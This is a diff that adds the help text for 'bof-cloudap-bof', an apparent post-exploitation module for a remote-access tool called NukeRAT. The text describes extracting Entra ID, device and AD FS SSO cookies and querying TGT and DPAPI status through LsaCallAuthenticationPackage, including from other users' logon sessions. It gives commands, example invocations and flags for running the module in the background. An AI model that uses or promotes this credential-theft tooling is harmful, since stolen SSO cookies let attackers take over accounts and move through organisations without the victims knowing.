@@ -1,0 +1,28 @@
+ABOUT
+    Extracts Entra ID SSO cookies, device SSO cookies, AD FS enterprise SSO
+    cookies, and cloud provider status via LsaCallAuthenticationPackage.
+    Requires Entra ID/Azure AD joined device with active cloud logon
+    session.
+USAGE:
+    bof-cloudap-bof --- <command> [LUID]
+
+COMMANDS:
+    ssocookie [LUID]        Extract Entra ID (Azure AD) SSO cookie
+    devicessocookie [LUID]  Extract device SSO cookie
+    enterprisesso [LUID]    Extract AD FS enterprise SSO cookie
+    info [LUID]             Query cloud provider info, TGT status, DPAPI status
+
+ARGUMENTS:
+    LUID    Logon session ID (0 or omit for current session)
+
+EXAMPLES:
+    bof-cloudap-bof --- ssocookie
+    bof-cloudap-bof --- ssocookie 0x21d57
+    bof-cloudap-bof --- info
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-cloudap-bof -w 60 --- ssocookie
